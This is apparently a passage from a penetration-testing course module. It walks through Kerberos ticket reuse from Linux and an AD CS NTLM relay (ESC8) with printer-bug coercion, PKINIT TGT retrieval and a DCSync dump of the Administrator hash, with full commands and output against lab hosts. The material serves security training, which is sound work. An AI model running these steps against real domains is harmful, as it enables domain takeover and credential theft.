<p>Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.</p>
<h4 id="evil-winrm">Evil-WinRM</h4>
<p>To use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called <code>krb5-user</code>. While installing, we&#39;ll get a prompt for the Kerberos realm. Use the domain name: <code>INLANEFREIGHT.HTB</code>, and the KDC is the <code>DC01</code>.</p>
<p><strong>Installing Kerberos authentication package</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> sudo apt-get install krb5-user -y

<span class="hljs-function"><span class="hljs-title">Reading</span></span> package lists... Done                                                                                                  
<span class="hljs-function"><span class="hljs-title">Building</span></span> dependency tree... Done    
<span class="hljs-function"><span class="hljs-title">Reading</span></span> state information... Done

...SNIP...
</code></pre>
<p><strong>Default Kerberos v5 realm</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/kerberos-realm.jpg" alt="Kerberos authentication configuration screen showing default realm as INLANEFREIGHT.HTB."></p>
<p>The Kerberos servers can be empty.</p>
<p><strong>Administrative server for your Kerberos realm</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/kerberos-server-dc01.jpg" alt="Kerberos authentication configuration screen with administrative server set to DC01 for INLANEFREIGHT.HTB realm."></p>
<p>In case the package <code>krb5-user</code> is already installed, we need to change the configuration file <code>/etc/krb5.conf</code> to include the following values:</p>
<p><strong>Kerberos configuration file for INLANEFREIGHT.HTB</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/krb5<span class="hljs-selector-class">.conf</span>

[libdefaults]
        default_realm = INLANEFREIGHT<span class="hljs-selector-class">.HTB</span>

..<span class="hljs-selector-class">.SNIP</span>...

[realms]
    INLANEFREIGHT<span class="hljs-selector-class">.HTB</span> = {
        kdc = dc01<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.htb</span>
    }

..<span class="hljs-selector-class">.SNIP</span>...
</code></pre>
<p>Now we can use evil-winrm.</p>
<p><strong>Using Evil-WinRM with Kerberos</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file <span class="hljs-string">found:</span> <span class="hljs-regexp">/etc/</span>proxychains.conf
[proxychains] preloading <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libproxychains.so<span class="hljs-number">.4</span>
[proxychains] DLL <span class="hljs-string">init:</span> proxychains-ng <span class="hljs-number">4.14</span>

Evil-WinRM shell v3<span class="hljs-number">.3</span>
<span class="hljs-symbol">
Warning:</span> Remote path completions are disabled due to ruby <span class="hljs-string">limitation:</span> quoting_detection_proc() function is unimplemented on <span class="hljs-keyword">this</span> machine
<span class="hljs-symbol">
Data:</span> For more information, check Evil-WinRM <span class="hljs-string">Github:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
<span class="hljs-symbol">
Info:</span> Establishing connection to remote endpoint

[proxychains] Strict chain  ...  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1080</span>  ...  <span class="hljs-string">dc01:</span><span class="hljs-number">5985</span>  ...  OK
*Evil-WinRM* PS <span class="hljs-string">C:</span>\Users\julio\Documents&gt; whoami ; hostname
inlanefreight\julio
DC01
</code></pre>
<h3 id="miscellaneous">Miscellaneous</h3>
<p>If we want to use a <code>ccache file</code> in Windows or a <code>kirbi file</code> in a Linux machine, we can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py">impacket-ticketConverter</a> to convert them. To use it, we specify the file we want to convert and the output filename. Let&#39;s convert Julio&#39;s ccache file to kirbi.</p>
<p><strong>Impacket Ticket converter</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span>@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

<span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.9</span><span class="hljs-number">.22</span> - <span class="hljs-symbol">Copyright</span> <span class="hljs-number">2020</span> <span class="hljs-symbol">SecureAuth</span> <span class="hljs-symbol">Corporation</span>

[*] converting ccache to kirbi...
[+] done
</code></pre>
<p>We can do the reverse operation by first selecting a <code>.kirbi file</code>. Let&#39;s use the <code>.kirbi</code> file in Windows.</p>
<p><strong>Importing converted ticket into Windows session with Rubeus</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-cmd-session">C:\htb&gt; C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb&gt; klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0&gt;     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -&gt; reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called:

C:\htb&gt;dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    &lt;DIR&gt;          .
07/14/2022  07:25 AM    &lt;DIR&gt;          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free</span>
</code></pre>
<h3 id="linikatz">Linikatz</h3>
<p><a href="https://github.com/CiscoCXSecurity/linikatz">Linikatz</a> is a tool created by Cisco&#39;s security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to <code>Mimikatz</code> to UNIX environments.</p>
<p>Just like <code>Mimikatz</code>, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with <code>linikatz.</code>. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.</p>
<p><strong>Linikatz download and execution</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
root@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   &lt; (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 959 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2169 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1702 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1679 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd/LVFS-CA.pem
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2169 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 959 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1679 </span>Mar <span class="hljs-number"> 4 </span><span class="hljs-number"> 2020 </span>/etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1609728 </span>Oct<span class="hljs-number"> 10 </span>19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1286144 </span>Oct <span class="hljs-number"> 7 </span>12:17 /var/lib/sss/db/config.ldb
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4154 </span>Oct<span class="hljs-number"> 10 </span>19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1609728 </span>Oct<span class="hljs-number"> 10 </span>19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1286144 </span>Oct <span class="hljs-number"> 4 </span>16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 10406312 </span>Oct<span class="hljs-number"> 10 </span>19:54 /var/lib/sss/mc/initgroups
-rw-rw-r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 6406312 </span>Oct<span class="hljs-number"> 10 </span>19:55 /var/lib/sss/mc/group
-rw-rw-r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 8406312 </span>Oct<span class="hljs-number"> 10 </span>19:53 /var/lib/sss/mc/passwd
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 113 </span>Oct <span class="hljs-number"> 7 </span>12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 40 </span>Oct <span class="hljs-number"> 7 </span>12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 15 </span>Oct <span class="hljs-number"> 7 </span>12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 12 </span>Oct<span class="hljs-number"> 10 </span>19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 504 </span>Oct <span class="hljs-number"> 6 </span>11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 8942 </span>Oct <span class="hljs-number"> 4 </span>16:25 /etc/samba/smb.conf
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 8 </span>Jul<span class="hljs-number"> 18 </span>12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2800 </span>Oct <span class="hljs-number"> 7 </span>12:17 /etc/krb5.conf
-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1348 </span>Oct <span class="hljs-number"> 4 </span>16:26 /etc/krb5.keytab
-rw-------<span class="hljs-number"> 1 </span>julio@inlanefreight.htb domain users@inlanefreight.htb<span class="hljs-number"> 1406 </span>Oct<span class="hljs-number"> 10 </span>19:55 /tmp/krb5cc_647401106_HRJDux
-rw-------<span class="hljs-number"> 1 </span>julio@inlanefreight.htb domain users@inlanefreight.htb<span class="hljs-number"> 1414 </span>Oct<span class="hljs-number"> 10 </span>19:55 /tmp/krb5cc_647401106_R9a9hG
-rw-------<span class="hljs-number"> 1 </span>carlos@inlanefreight.htb domain users@inlanefreight.htb<span class="hljs-number"> 3175 </span>Oct<span class="hljs-number"> 10 </span>19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [check] KCM Kerberos tickets
</code></pre>
<h3 id="onwards">Onwards</h3>
<p>Now that we&#39;ve seen how to perform various lateral movement techniques from Windows and Linux hosts, we&#39;ll dive into cracking protected files. It&#39;s worth trying all these lateral movement techniques until they become second nature. You never know what you will run into during an assessment, and having an extensive toolkit is critical.</p>
<hr>
<h2 id="pass-the-certificate">Pass the Certificate</h2>
<p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b">PKINIT</a>, short for <code>Public Key Cryptography for Initial Authentication</code>, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. <code>Pass-the-Certificate</code> refers to the technique of using X.509 certificates to successfully obtain <code>Ticket Granting Tickets (TGTs)</code>. This method is used primarily alongside <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">attacks against Active Directory Certificate Services (AD CS)</a>, as well as in <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c">Shadow Credential</a> attacks.</p>
<h3 id="ad-cs-ntlm-relay-attack-esc8-">AD CS NTLM Relay Attack (ESC8)</h3>
<p>Note: Attacks against Active Directory Certificate Services are covered in great depth in the <a href="https://academy.hackthebox.com/module/details/236">ADCS Attacks</a> module.</p>
<p><code>ESC8</code>—as described in the <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a> paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, <code>including web enrollment</code>, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at <code>/CertSrv</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/PtC_1.png" alt="Microsoft Active Directory Certificate Services webpage for inlanefreight-CA01-CA. Options to request a certificate, view pending requests, or download a certificate chain or CRL."></p>
<p>Attackers can use Impacket’s <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a> to listen for inbound connections and relay them to the web enrollment service using the following command:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ impacket-ntlmrelayx -t http:/</span><span class="hljs-regexp">/10.129.234.110/certsrv</span><span class="hljs-regexp">/certfnsh.asp --adcs -smb2support --template KerberosAuthentication</span>
</code></pre>
<p>Note: The value passed to <code>--template</code> may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like <a href="https://github.com/ly4k/Certipy">certipy</a>.</p>
<p>Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printer bug</a>. This attack requires the targeted machine account to have the <code>Printer Spooler</code> service running. The command below forces <code>10.129.234.109 (DC01)</code> to attempt authentication against <code>10.10.16.12 (attacker host)</code>:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:<span class="hljs-string">"package5shores_topher1"</span>@<span class="hljs-number">10.129</span><span class="hljs-meta">.234</span><span class="hljs-meta">.109</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.16</span><span class="hljs-meta">.12</span>

[*] Impacket v0<span class="hljs-meta">.12</span><span class="hljs-meta">.0</span> - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC <span class="hljs-meta">at</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.234</span><span class="hljs-meta">.109</span>
[*] Bind OK
[*] Got handle
RPRN SessionError: code: <span class="hljs-number">0x6ba</span> - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may <span class="hljs-keyword">or</span> may <span class="hljs-keyword">not</span> have worked
</code></pre>
<p>Referring back to <code>ntlmrelayx</code>, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for <code>DC01$</code>:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.12</span><span class="hljs-number">.0</span> - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies 

[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMTP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMB</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">RPC</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">MSSQL</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAPS</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAPS</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTPS</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">DCSYNC</span> loaded..
[*] <span class="hljs-symbol">Running</span> in relay mode to single host
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">SMB</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">445</span>
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">HTTP</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">80</span>
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WCF</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">9389</span>
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">RAW</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">6666</span>
[*] <span class="hljs-symbol">Multirelay</span> disabled

[*] <span class="hljs-symbol">Servers</span> started, waiting for connections
[*] <span class="hljs-symbol">SMBD</span>-<span class="hljs-symbol">Thread</span><span class="hljs-number">-5</span> (process_request_thread): <span class="hljs-symbol">Received</span> connection from <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.109</span>, attacking target http://<span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.110</span>
[*] <span class="hljs-symbol">HTTP</span> server returned error code <span class="hljs-number">404</span>, treating as a successful login
[*] <span class="hljs-symbol">Authenticating</span> against http://<span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.110</span> as <span class="hljs-symbol">INLANEFREIGHT</span>/<span class="hljs-symbol">DC01</span>$ <span class="hljs-symbol">SUCCEED</span>
[*] <span class="hljs-symbol">SMBD</span>-<span class="hljs-symbol">Thread</span><span class="hljs-number">-7</span> (process_request_thread): <span class="hljs-symbol">Received</span> connection from <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.109</span>, attacking target http://<span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.110</span>
[-] <span class="hljs-symbol">Authenticating</span> against http://<span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.110</span> as / <span class="hljs-symbol">FAILED</span>
[*] <span class="hljs-symbol">Generating</span> <span class="hljs-symbol">CSR</span>...
[*] <span class="hljs-symbol">CSR</span> generated!
[*] <span class="hljs-symbol">Getting</span> certificate...
[*] <span class="hljs-symbol">GOT</span> <span class="hljs-symbol">CERTIFICATE</span>! <span class="hljs-symbol">ID</span> <span class="hljs-number">8</span>
[*] <span class="hljs-symbol">Writing</span> <span class="hljs-symbol">PKCS</span>#<span class="hljs-number">12</span> certificate to ./<span class="hljs-symbol">DC01</span>$.pfx
[*] <span class="hljs-symbol">Certificate</span> successfully written to file
</code></pre>
<p>We can now perform a <code>Pass-the-Certificate</code> attack to obtain a TGT as <code>DC01$</code>. One way to do this is by using <a href="https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py">gettgtpkinit.py</a>. First, let&#39;s clone the repository and install the dependencies:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ git clone https:/</span><span class="hljs-regexp">/github.com/</span>dirkjanm/PKINITtools.git &amp;&amp; cd PKINITtools
root<span class="hljs-meta">@htb</span>[/htb]$ python3 -m venv .venv
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ source .venv/</span>bin/activate
root<span class="hljs-meta">@htb</span>[/htb]$ pip3 install -r requirements.txt
</code></pre>
<p>Then, we can begin the attack.</p>
<p>Note: If you encounter error stating <code>&quot;Error detecting the version of libcrypto&quot;</code>, it can be fixed by installing the <a href="https://github.com/wbond/oscrypto">oscrypto</a> library.</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ pip3 install -I git+http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/wbond/oscrypto.git
Defaulting <span class="hljs-keyword">to</span> user installation because <span class="hljs-keyword">normal</span> site-packages <span class="hljs-keyword">is</span> not writeable
Collecting git+http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/wbond/oscrypto.git
<span class="hljs-symbol">&lt;SNIP&gt;</span>
Successfully built oscrypto
Installing collected package<span class="hljs-variable">s:</span> asn1crypto, oscrypto
Successfully installed asn1crypto-<span class="hljs-number">1.5</span>.<span class="hljs-number">1</span> oscrypto-<span class="hljs-number">1.3</span>.<span class="hljs-number">0</span>
</code></pre>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">python3</span> gettgtpkinit.<span class="hljs-keyword">py</span> -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">234.109</span> <span class="hljs-string">'inlanefreight.local/dc01$'</span> /tmp/dc.ccache

<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">21</span>:<span class="hljs-number">20</span>:<span class="hljs-number">40</span>,<span class="hljs-number">073</span> minikerberos INFO     Loading certificate <span class="hljs-built_in">and</span> key from <span class="hljs-keyword">file</span>
INFO:minikerbero<span class="hljs-variable">s:Loading</span> certificate <span class="hljs-built_in">and</span> key from <span class="hljs-keyword">file</span>
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">21</span>:<span class="hljs-number">20</span>:<span class="hljs-number">40</span>,<span class="hljs-number">351</span> minikerberos INFO     Requesting TGT
INFO:minikerbero<span class="hljs-variable">s:Requesting</span> TGT
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">21</span>:<span class="hljs-number">21</span>:<span class="hljs-number">05</span>,<span class="hljs-number">508</span> minikerberos INFO     AS-REP encryption key (you might need this <span class="hljs-keyword">later</span>):
INFO:minikerbero<span class="hljs-variable">s:AS</span>-REP encryption key (you might need this <span class="hljs-keyword">later</span>):
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">21</span>:<span class="hljs-number">21</span>:<span class="hljs-number">05</span>,<span class="hljs-number">508</span> minikerberos INFO     <span class="hljs-number">3</span>a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
INFO:minikerbero<span class="hljs-variable">s:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616</span>
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">21</span>:<span class="hljs-number">21</span>:<span class="hljs-number">05</span>,<span class="hljs-number">512</span> minikerberos INFO     Saved TGT <span class="hljs-keyword">to</span> <span class="hljs-keyword">file</span>
INFO:minikerbero<span class="hljs-variable">s:Saved</span> TGT <span class="hljs-keyword">to</span> <span class="hljs-keyword">file</span>
</code></pre>
<p>Once we successfully obtain a TGT, we&#39;re back in familiar Pass-the-Ticket (PtT) territory. As the domain controller&#39;s machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
root@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">234.109</span> -just-dc-user Administrator <span class="hljs-string">'INLANEFREIGHT.LOCAL/DC01$'</span>@DC01.INLANEFREIGHT.LOCAL

Impacket v0.<span class="hljs-number">12.0</span> - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] <span class="hljs-keyword">Using</span> the DRSUAPI <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">get</span> <span class="hljs-title">NTDS</span>.<span class="hljs-title">DIT</span> <span class="hljs-title">secrets</span>
<span class="hljs-title">Administrator</span>:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
&lt;SNIP&gt;
</code></pre>
